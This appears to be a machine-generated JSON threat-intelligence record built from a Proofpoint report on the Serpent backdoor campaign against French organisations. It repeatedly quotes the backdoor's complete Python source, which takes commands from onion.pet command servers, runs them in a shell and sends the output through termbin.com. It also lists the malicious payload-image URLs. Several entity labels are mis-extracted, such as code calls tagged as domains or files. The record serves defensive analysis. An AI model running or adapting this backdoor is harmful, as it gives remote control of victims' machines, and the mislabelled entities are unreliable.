                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "use_geo",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ],
        "Industry": [
            {
                "token": {
                    "id": "<INDUSTRY_0x6ba3d0a8>",
                    "type": "Industry",
                    "value": "government"
                },
                "references": {
                    "sentences": [
                        "Proofpoint observed new, targeted activity impacting French entities in the construction and government sectors. The threat actor used macro-enabled Microsoft Word documents to distribute the Chocolatey installer package, an open-source package installer. Various parts of the VBA macro include the following ASCII art and depict a snake as below.",
                        "Proofpoint identified a targeted attack leveraging an open-source package installer Chocolatey to deliver a backdoor.<crlf>The attack targeted French entities in the construction, real estate, and government industries.<crlf>The attacker used a resume themed subject and lure purporting to be GDPR information.<crlf>The attacker used steganography, including a cartoon image, to download and install the Serpent backdoor.<crlf>The attacker also demonstrated a novel detection bypass technique using a Scheduled Task.<crlf>Objectives are currently unknown however based on the tactics and targeting observed it is likely an advanced, targeted threat."
                    ],
                    "titles": [
                        "Overview",
                        "Key Findings"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<INDUSTRY_0x6ba3d0a8>",
                            "type": "Industry",
                            "value": "government"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ]
    },
    "iocs": {
        "Url": [
            {
                "token": {
                    "id": "<URL_0xb6fb790d>",
                    "type": "Url",
                    "value": "https://www.fhccu.com/images/ship3.jpg"
                },
                "references": {
                    "sentences": [
                        "When macros are enabled, the document executes that macro, which reaches out to an image URL, e.g., https://www.fhccu[.]com/images/ship3[.]jpg, containing a base64 encoded PowerShell script hidden in the image using steganography. The PowerShell script first downloads, installs, and updates the Chocolatey installer package and repository script. Chocolatey is a software management automation tool for Windows that wraps installers, executables, zips, and scripts into compiled packages, similar to Homebrew for OSX. The software provides both open-source and paid versions with various levels of functionality. Proofpoint has not previously observed a threat actor use Chocolatey in campaigns."
                    ],
                    "titles": [
                        "Campaign Details",
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xb6fb790d>",
                            "type": "Url",
                            "value": "https://www.fhccu.com/images/ship3.jpg"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb6fb790d>",
                            "type": "Url",
                            "value": "https://www.fhccu.com/images/ship3.jpg"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x5079389>",
                            "type": "UnknownWord",
                            "value": "macros"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<URL_0x998175ae>",
                    "type": "Url",
                    "value": "https://www.fhccu.com/images/7.jpg"
                },
                "references": {
                    "sentences": [
                        "Next, the script fetches another image file, e.g. https://www.fhccu[.]com/images/7[.]jpg, which contains a base64 encoded Python script also hidden using steganography, and saves the Python script as MicrosoftSecurityUpdate.py. The script then creates and executes a .bat file that in turn executes the Python script."
                    ],
                    "titles": [
                        "Campaign Details",
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0x998175ae>",
                            "type": "Url",
                            "value": "https://www.fhccu.com/images/7.jpg"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<URL_0x70e047c4>",
                    "type": "Url",
                    "value": "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html"
                },
                "references": {
                    "sentences": [
                        "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd[.]onion[.]pet/index.html"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0x70e047c4>",
                            "type": "Url",
                            "value": "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x70e047c4>",
                            "type": "Url",
                            "value": "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x6a35444b>",
                            "type": "Category",
                            "value": "proxy"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<URL_0xdc412f5b>",
                    "type": "Url",
                    "value": "http://shorturl.at/qzes8"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xdc412f5b>",
                            "type": "Url",
                            "value": "http://shorturl.at/qzes8"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6dd302d7>",
                            "type": "UnknownWord",
                            "value": "shorturl"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xdc412f5b>",
                            "type": "Url",
                            "value": "http://shorturl.at/qzes8"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ],
        "Domain": [
            {
                "token": {
                    "id": "<DOMAIN_0x63f8d79a>",
                    "type": "Domain",
                    "value": "microsoftsecurityupdate.py"
                },
                "references": {
                    "sentences": [
                        "Next, the script fetches another image file, e.g. https://www.fhccu[.]com/images/7[.]jpg, which contains a base64 encoded Python script also hidden using steganography, and saves the Python script as MicrosoftSecurityUpdate.py. The script then creates and executes a .bat file that in turn executes the Python script."
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x63f8d79a>",
                            "type": "Domain",
                            "value": "microsoftsecurityupdate.py"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<DOMAIN_0x8f0b70ab>",
                    "type": "Domain",
                    "value": "run.stdout.read"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x8f0b70ab>",
                            "type": "Domain",
                            "value": "run.stdout.read"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x8f0b70ab>",
                            "type": "Domain",
                            "value": "run.stdout.read"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<DOMAIN_0xe64967df>",
                    "type": "Domain",
                    "value": "termbin.com"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0xe64967df>",
                            "type": "Domain",
                            "value": "termbin.com"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0xe64967df>",
                            "type": "Domain",
                            "value": "termbin.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<DOMAIN_0x6a05e9c2>",
                    "type": "Domain",
                    "value": "onion.pet"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely."
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xe5b88b00>",
                            "type": "UnknownWord",
                            "value": "integer>--<hostname>--<command>"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x2ffc296e>",
                            "type": "UnknownWord",
                            "value": "<random"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7ba9c70d>",
                            "type": "UnknownWord",
                            "value": "bin"
                        }
                    }
                ]
            }
        ],
        "File": [
            {
                "token": {
                    "id": "<FILE_0x7d600cb1>",
                    "type": "File",
                    "value": "socket.gethostname"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x7d600cb1>",
                            "type": "File",
                            "value": "socket.gethostname"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7d600cb1>",
                            "type": "File",
                            "value": "socket.gethostname"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xa66d738>",
                    "type": "File",
                    "value": "headers.update"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x1474cd1f>",
                            "type": "UnknownWord",
                            "value": "cache_control"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xde5a0231>",
                            "type": "UnknownWord",
                            "value": "termbin_header"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x785e1f>",
                    "type": "File",
                    "value": "sock.recv"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x785e1f>",
                            "type": "File",
                            "value": "sock.recv"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x785e1f>",
                            "type": "File",
                            "value": "sock.recv"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xe1878a4a>",
                    "type": "File",
                    "value": "requests.get"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xea8af474>",
                            "type": "UnknownWord",
                            "value": "cmd_url_order"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x26667769>",
                            "type": "UnknownWord",
